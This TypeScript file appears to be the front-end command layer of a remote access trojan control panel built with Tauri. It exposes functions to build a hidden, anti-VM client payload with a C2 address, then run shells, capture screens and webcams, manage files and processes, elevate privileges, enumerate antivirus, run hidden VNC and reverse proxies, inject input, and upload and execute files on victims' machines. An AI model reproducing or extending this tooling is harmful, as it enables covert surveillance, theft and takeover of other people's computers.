import { invoke } from "@tauri-apps/api/core";
import { RATClient, RATState, AssemblyInfo, TrollCommand } from "../../types";

export const startServerCmd = async (port: string): Promise<string> => {
  return invoke("start_server", { port });
};

export const stopServerCmd = async (): Promise<string> => {
  return invoke("stop_server");
};

export const buildClientCmd = async (
  ip: string,
  port: string,
  mutexEnabled: boolean,
  mutex: string,
  unattendedMode: boolean,
  assemblyInfo: AssemblyInfo,
  enableIcon: boolean,
  iconPath: string,
  enableInstall: boolean,
  installFolder: string,
  installFileName: string,
  group: string,
  enableHidden: boolean,
  antiVmDetection: boolean
): Promise<void> => {
  return invoke("build_client", {
    ip,
    port,
    mutexEnabled,
    mutex,
    unattendedMode,
    assemblyInfo,
    enableIcon,
    iconPath,
    enableInstall,
    installFolder,
    installFileName,
    group,
    enableHidden,
    antiVmDetection,
  });
};

export const fetchClientsCmd = async (): Promise<RATClient[]> => {
  let clients: RATClient[] = await invoke("fetch_clients");
  return clients;
};

export const fetchStateCmd = async (): Promise<RATState> => {
  return invoke("fetch_state");
};

export const fetchClientCmd = async (
  addr: string | undefined
): Promise<RATClient> => {
  return invoke("fetch_client", { addr });
};

export const manageClientCmd = async (
  addr: string | undefined,
  run: string
): Promise<void> => {
  return invoke("manage_client", { addr, run });
};

export const takeScreenshotCmd = async (
  addr: string | undefined,
  display: number
): Promise<void> => {
  return invoke("take_screenshot", { addr, display });
};

export const takeWebcamCmd = async (
  addr: string | undefined
): Promise<void> => {
  return invoke("request_webcam", { addr });
};

export const handleSystemCommandCmd = async (
  addr: string | undefined,
  run: string
): Promise<void> => {
  return invoke("handle_system_command", { addr, run });
};

export const readFilesCmd = async (
  addr: string | undefined,
  run: string,
  path: string
): Promise<Array<string>> => {
  console.log("readFilesCmd", addr, run, path);
  return invoke("read_files", { addr, run, path });
};

export const manageFileCmd = async (
  addr: string | undefined,
  run: string,
  file: string
): Promise<void> => {
  return invoke("manage_file", { addr, run, file });
};

export const processListCmd = async (
  addr: string | undefined
): Promise<void> => {
  return invoke("process_list", { addr });
};

export const killProcessCmd = async (
  addr: string | undefined,
  pid: number,
  name: string
): Promise<void> => {
  return invoke("kill_process", { addr, pid, name });
};

export const handleProcessCmd = async (
  addr: string | undefined,
  run: string,
  pid: number,
  name: string
): Promise<void> => {
  return invoke("handle_process", { addr, run, pid, name });
};

export const startProcessCmd = async (
  addr: string | undefined,
  name: string
): Promise<void> => {
  return invoke("start_process", { addr, name });
};

export const stopShellCmd = async (addr: string | undefined): Promise<void> => {
  return invoke("manage_shell", { addr, run: "stop" });
};

export const startShellCmd = async (
  addr: string | undefined
): Promise<void> => {
  return invoke("manage_shell", { addr, run: "start" });
};

export const executeShellCommandCmd = async (
  addr: string | undefined,
  run: string
): Promise<void> => {
  return invoke("execute_shell_command", { addr, run });
};

export const visitWebsiteCmd = async (
  addr: string | undefined,
  url: string
): Promise<void> => {
  return invoke("visit_website", { addr, url });
};

export const handleElevateCmd = async (
  addr: string | undefined
): Promise<void> => {
  return invoke("elevate_client", { addr });
};

export const testMessageBoxCmd = async (
  title: string,
  message: string,
  button: string,
  icon: string
): Promise<void> => {
  return invoke("test_messagebox", { title, message, button, icon });
};

export const sendMessageBoxCmd = async (
  addr: string | undefined,
  title: string,
  message: string,
  button: string,
  icon: string
): Promise<void> => {
  return invoke("send_messagebox", { addr, title, message, button, icon });
};

export const sendInputBoxCmd = async (
  addr: string | undefined,
  title: string,
  message: string
): Promise<void> => {
  return invoke("send_inputbox", { addr, title, message });
};

export const startReverseProxyCmd = async (
  addr: string | undefined,
  port: string,
  localport: string
): Promise<void> => {
  return invoke("start_reverse_proxy", { addr, port, localport });
};

export const stopReverseProxyCmd = async (
  addr: string | undefined
): Promise<void> => {
  return invoke("stop_reverse_proxy", { addr });
};

export const getInstalledAVsCmd = async (
  addr: string | undefined
): Promise<void> => {
  return invoke("get_installed_avs", { addr });
};

export const startRemoteDesktopCmd = async (
  addr: string | undefined,
  display: number,
  quality: number,
  fps: number
): Promise<void> => {
  return invoke("start_remote_desktop", { addr, display, quality, fps });
};

export const stopRemoteDesktopCmd = async (
  addr: string | undefined
): Promise<void> => {
  return invoke("stop_remote_desktop", { addr });
};

export const sendKeyboardInputCmd = async (
  addr: string | undefined,
  keyCode: number,
  character: string,
  isKeydown: boolean,
  shiftPressed: boolean,
  ctrlPressed: boolean,
  capsLock: boolean
): Promise<void> => {
  return invoke("send_keyboard_input", {
    addr,
    keyCode,
    character,
    isKeydown,
    shiftPressed,
    ctrlPressed,
    capsLock,
  });
};

export const sendMouseClickCmd = async (
  addr: string | undefined,
  display: number,
  x: number,
  y: number,
  clickType: number,
  actionType: number,
  scrollAmount: number
): Promise<void> => {
  return invoke("send_mouse_click", {
    addr,
    display,
    x,
    y,
    clickType,
    actionType,
    scrollAmount,
  });
};

export const manageHVNC = async (
  addr: string | undefined,
  run: string
): Promise<void> => {
  return invoke("manage_hvnc", { addr, run });
};

export const uploadAndExecute = async (
  addr: string | undefined,
  filePath: string
): Promise<void> => {
  return invoke("upload_and_execute", { addr, filePath });
};

export const executeFile = async (
  addr: string | undefined,
  filePath: string
): Promise<void> => {
  return invoke("execute_file", { addr, filePath });
};

export const sendTrollCommand = async (
  addr: string | undefined,
  command: TrollCommand
): Promise<void> => {
  console.log("Sending troll command:", command);
  const cleanCommand = { ...command };

  if (cleanCommand.payload == undefined) {
    cleanCommand.payload = "null";
  }

  console.log("Sending troll command:", cleanCommand);

  await invoke("send_troll_command", {
    addr,
    command: cleanCommand,
  });
};
